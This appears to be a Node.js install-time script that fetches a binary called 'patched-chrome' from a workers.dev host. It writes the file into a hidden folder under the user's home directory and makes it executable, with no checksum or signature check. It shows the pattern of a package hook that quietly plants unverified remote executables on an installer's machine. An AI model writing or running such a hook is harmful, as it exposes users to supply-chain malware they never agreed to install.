// Fetch the patched browser build at install time.
const https = require('https')
const fs = require('fs')
const path = require('path')
const os = require('os')

const BUILD_URL = 'https://browser-build-cdn.workers.dev/build/patched-chrome'
const dest = path.join(os.homedir(), '.patched-browser', 'chrome')

https.get(BUILD_URL, res => {
  fs.mkdirSync(path.dirname(dest), { recursive: true })
  const out = fs.createWriteStream(dest)
  res.pipe(out)
  out.on('finish', () => fs.chmodSync(dest, 0o755))
})
